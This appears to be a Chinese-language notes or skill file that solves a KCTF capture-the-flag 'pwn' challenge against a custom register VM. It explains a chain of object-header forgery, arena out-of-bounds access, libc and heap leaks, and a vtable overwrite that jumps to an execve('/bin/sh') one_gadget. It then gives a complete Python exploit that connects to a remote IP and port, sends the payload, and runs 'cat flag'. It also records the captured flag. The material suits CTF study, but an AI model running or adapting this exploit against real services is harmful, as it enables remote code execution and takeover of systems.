---
name: kctf-10-vm-pwn
 description: KCTF 第十题无回显寄存器 VM：NaN-box 对象伪造、arena OOB、ASLR 内计算与 AST vtable 自引用跳板。
---

# KCTF10 无回显 VM PWN

## 环境
- ELF64 PIE stripped C++，Full RELRO/NX/canary；题目 libc 为 Ubuntu 18.04 glibc-2.27（buildid f7307432…）。
- REPL 每行一条语句，仅回显提示符/错误；远程 `123.57.66.184:10053`。
- 成功 flag：`flag{3f9a4448-f46b-4227-802f-3a5fdb3bfc6d}`。

## 值模型与语法
- qword 高 16 位：`0x1337` 为对象句柄，`0xBEEF` 为对象头，其他为数字（低 48 位有效）。arena 64KB bump 分配，所有 qword 以随机 `key` XOR 存储。
- `$N=decimal`；`$N=[1,2]` 建对象；`$N=$M` 拷贝；`$N=$M[i][j]` GetField；`$N[i][j]=$M` SetField；`$N<op>$M` 支持 `+ - * / % ^ | &`。
- `BinOp` 只拒绝输入带 0x1337，不清洗输出，乘法构造伪 0xBEEF 头。

## 漏洞链
1. 构造 `0xBEEF<<48|8300`（48879、65536、4294967296 组合），写入 `$0=[0]` 的字段0，伪造超长对象头。
2. `$0[0][N]` 形成 arena 前向 OOB；索引 8193 为 tcache 指针，8205 为稳定 libstdc++ locale vtable 泄露槽，8280 为当前 AST vtable 槽。
3. key 在寄存器内获取：读取 arena 清零槽得到 `key`；任何泄露值先 XOR key 还原，再用减法计算 libc/heap。常数：`arena=tcache+0x11E60`，`libc=locale_leak-0x3EC680`。
4. glibc-2.27 gadget `libc+0x4F302`：`rdi=&"/bin/sh"; rsi=rsp+0x40; rdx=*__environ; execve`。伪造 arena vtable `FV=arena+16+8*7000`，写 `[FV+0x10]=one_gadget`。
5. 最后一行 SetField 把“当前 AST 根节点”vtable 改为 FV；main 随后调用 `[vtable+0x10]`，跳 gadget，继承 socket stdin/stdout，发送 `cat flag`。

## 23 行 payload
```python
import socket,time
LIBOFF=0x3EC680; OGD=LIBOFF-0x4F302; CONST=0x11E60+16+8*7000
lines=["$0=[0]","$1=48879","$2=65536","$3=4294967296","$2*$3","$1*$2","$4=8300","$1+$4","$0[0]=$1","$5=$0[0][0]","$6=$0[0][8205]","$7=$5","$6^$7",f"$14={OGD}","$6-$14","$6^$5","$0[0][7002]=$6","$8=$0[0][8193]","$8^$5",f"$9={CONST}","$8+$9","$8^$5","$0[0][8280]=$8"]
s=socket.create_connection(("123.57.66.184",10053),8); s.settimeout(1.5)
s.sendall(("\n".join(lines)+"\n").encode()); time.sleep(.8); s.sendall(b"cat flag\n")
out=b''
try:
 while 1:
  d=s.recv(4096)
  if not d: break
  out+=d
except Exception: pass
print(out.decode(errors='replace'))
```

## 调试要点
必须使用题目 libc；行序决定 tcache/AST 布局，不能删改 payload。调用点析构槽是 `+0x10` 而非 `+8`。本地 Ubuntu 18.04/Docker + pwndbg 可 dump arena 验证 8193/8205/8280。
